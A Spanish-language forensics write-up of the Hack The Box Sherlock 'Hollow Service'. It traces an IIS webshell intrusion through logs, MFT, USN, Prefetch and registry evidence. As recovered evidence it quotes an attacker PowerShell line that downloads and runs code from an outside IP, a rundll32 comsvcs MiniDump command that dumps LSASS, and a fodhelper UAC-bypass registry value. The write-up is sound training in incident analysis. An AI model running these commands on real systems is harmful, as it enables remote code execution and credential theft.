### Hack The Box | Hollow Service.

Sherlock: Digital Forensics.

En esta máquina nos dan una colección de KAPE de una computadora Windows 10 que tenía una aplicación interna en IIS. La alerta salió porque el proceso de IIS empezó a crear procesos raros. La tarea fue seguir los rastros y entender cómo entraron, cómo ejecutaron cosas en el servidor y cómo llegaron a crear un dump de LSASS.

Al principio parece que solo hay muchos archivos sueltos: logs de IIS, eventos de Windows, MFT, USN, Prefetch, Amcache y registros. Lo importante fue ir comparando tiempos y nombres entre las evidencias, porque cada archivo cuenta una parte diferente.

## Preparando la evidencia

Primero verificamos el hash del ZIP antes de extraerlo y trabajamos sobre una copia. En el Windows del laboratorio organicé los archivos con una carpeta `Analysis`, otra `tools` para las herramientas y una `output` para los CSV. Usé principalmente MFTECmd, EvtxECmd, PECmd, AmcacheParser, RECmd y `secretsdump.py`.

Para sacar eventos de Sysmon y Security a CSV:

```powershell
.\tools\EvtxECmd.exe -f '.\C\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx' `
    --inc '1,3' --csv '.\output\events' --csvf sysmon.csv

.\tools\EvtxECmd.exe -f '.\C\Windows\System32\winevt\Logs\Security.evtx' `
    --inc '4672,4688' --csv '.\output\events' --csvf security.csv
```

En Calc filtré por `EventId` y busqué nombres de procesos, usuarios e IPs dentro de `Payload`. Cuando encontraba un evento interesante, usaba el `EventRecordId` para abrirlo en Event Log Explorer y revisar el XML.

Ojo con las horas: IIS y el XML de los eventos están en UTC, aunque el visor puede mostrar hora local. Para correlacionar fechas, revisé siempre el timestamp UTC; con PowerShell también se puede usar `.TimeCreated.ToUniversalTime()`.

## Seguí el rastro desde IIS

Abrí el log `C\inetpub\logs\LogFiles\W3SVC1\u_ex260516.log` y busqué las peticiones a `upload.aspx`. En la cabecera `#Fields` identifiqué cuál columna era la IP del cliente. Vi varias direcciones, pero las peticiones que prueban el upload y luego llaman al webshell venían de `192.168.100.2`.

La primera prueba contra `/internalapp/upload.aspx` devolvió `404.3`. Para no confundir los códigos, miré por separado `sc-status`, `sc-substatus` y `sc-win32-status`: el substatus que pedía la pregunta era `3`.

Luego quise entender dónde quedó el webshell y si lo renombraron. Parseé el MFT:

```powershell
.\tools\MFTECmd.exe -f '.\C\$MFT' --csv '.\output' --csvf mft.csv
```

Filtré el `ParentPath` por `inetpub\internalapp\uploads` y vi los archivos `.aspx`. El POST exitoso fue a las 10:43:36 UTC y a las 10:43:52 llamaron a `shell.aspx`, así que el archivo inicial era:

`C:\inetpub\internalapp\uploads\shell.aspx`

Para saber el nuevo nombre, el MFT no era suficiente. Parseé el USN journal y filtré por `shell.aspx` y `status.aspx`, buscando `RenameOldName` y `RenameNewName`:

```powershell
.\tools\MFTECmd.exe -f '.\C\$Extend\$J' --csv '.\output' --csvf usn.csv
```

El registro mostraba el cambio de nombre a `status.aspx`. También comprobé el log IIS y vi que después de eso las peticiones ya iban a `uploads/status.aspx`.

## El comando de PowerShell y el C2

En la petición al webshell encontré un parámetro `-enc`. Copié solo el texto codificado y lo pasé por CyberChef: primero URL Decode, luego From Base64 y finalmente Decode Text en UTF-16LE. El comando que salió fue:

```powershell
IEX ((new-object net.webclient).downloadstring('http://46.101.189.224/svc'))
```

Así encontré el servidor al que se conectaba el stager: `46.101.189.224`. Después busqué esa IP en los eventos de red de Sysmon (Event ID 3) y confirmé conexiones de `powershell.exe` al puerto 80.

También revisé el proceso `w3wp.exe` en Sysmon. En el evento donde ejecutan `whoami`, el proceso hijo aparece bajo `DESKTOP-B36HA4E\svcapp`, que era la cuenta usada por el worker de IIS.

## De svcapp a SYSTEM

Busqué eventos Security 4672 para `svcapp` y miré `PrivilegeList`. Ahí aparecía `SeImpersonatePrivilege`. Esto me dio la pista para entender la escalada con PrintSpoofer: abusa de la suplantación de tokens para obtener un token de SYSTEM.

En el MFT encontré un ejecutable llamado `MicrosoftEdgeUpdate.exe` en `C:\Windows\Temp`. El nombre parecía legítimo, pero la ubicación y el tamaño no coincidían con el Edge Update normal. Revisé su Prefetch con PECmd y confirmé que se había ejecutado desde Temp. Después usé AmcacheParser para sacar el hash del archivo y lo busqué en VirusTotal; la detección lo identificaba como **PrintSpoofer**.

El comando para revisar el Prefetch fue:

```powershell
.\tools\PECmd.exe -f '.\C\Windows\Prefetch\MICROSOFTEDGEUPDATE.EXE-C91A3157.pf'
```

Este camino corresponde a **Token Impersonation/Theft**, MITRE ATT&CK `T1134.001`.

## Fodhelper y el cambio en el registro

También aparecía actividad de `fodhelper.exe`, así que revisé el hive `UsrClass.dat` de `svcapp` con RECmd. Tuve que mantener los archivos de transacción `UsrClass.dat.LOG1` y `LOG2` junto al hive para que se pudieran aplicar los cambios recuperados.

```powershell
.\tools\RECmd.exe -f '.\C\Users\svcapp\AppData\Local\Microsoft\Windows\UsrClass.dat' `
    --kn 'ms-settings\Shell\Open\command'
```

La clave recuperada tenía `cmd.exe` como valor por defecto y `DelegateExecute` vacío. En el contexto del usuario corresponde a:

`HKCU\Software\Classes\ms-settings\Shell\Open\command`

El timestamp de la clave y el Prefetch de `fodhelper.exe` coincidían casi al segundo. Esto corresponde al intento de bypass de UAC `T1548.002`. En el análisis también quedó claro que esta parte es distinta de PrintSpoofer: una técnica es el bypass de UAC y la otra es la suplantación del token para escalar a SYSTEM.

## Dump de LSASS y cuentas locales

En el evento Security 4688 busqué `comsvcs.dll` y `MiniDump`. El proceso `rundll32.exe` corría como SYSTEM y usó este comando para guardar el dump:

```text
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 708 C:\Windows\Temp\lsass.dmp full
```

El PID de LSASS era `708`, y el archivo `C:\Windows\Temp\lsass.dmp` también aparecía en el MFT con hora de creación coincidente. Revisar Prefetch de Rundll32 ayudó a confirmar la ejecución y el uso de `COMSVCS.DLL`.

Por último, usé `secretsdump.py` en modo local con los hives SAM y SYSTEM para revisar las cuentas locales. Filtré por el hash NT de contraseña vacía `31d6cfe0d16ae931b73c59d7e0c089c0`. Salían Guest, DefaultAccount y Joe; quitando las dos cuentas integradas, la cuenta local sin contraseña era `Joe`.

## Cómo quedó la historia

El cliente `192.168.100.2` encontró y usó el upload de IIS para subir un webshell ASPX. Lo guardó primero como `shell.aspx` y luego lo renombró a `status.aspx`. Desde ahí mandó un PowerShell codificado que descargaba y ejecutaba contenido desde `46.101.189.224`.

IIS ejecutaba como `DESKTOP-B36HA4E\svcapp`, que tenía `SeImpersonatePrivilege`. El ejecutable disfrazado de Edge Update era PrintSpoofer y la evidencia apunta a que lo usaron para obtener SYSTEM mediante token impersonation. También quedó el cambio de registro asociado a Fodhelper y el intento de bypass de UAC. Finalmente, como SYSTEM ejecutaron Rundll32 con `comsvcs.dll` para crear `lsass.dmp`.

Lo que más me sirvió fue no confiar en una sola fuente: IIS mostró las peticiones, el USN confirmó el rename, Sysmon ayudó con procesos y conexiones, Prefetch confirmó ejecuciones y el registro guardó la configuración usada por Fodhelper. Juntando las horas de todo eso pude reconstruir el orden de la intrusión.
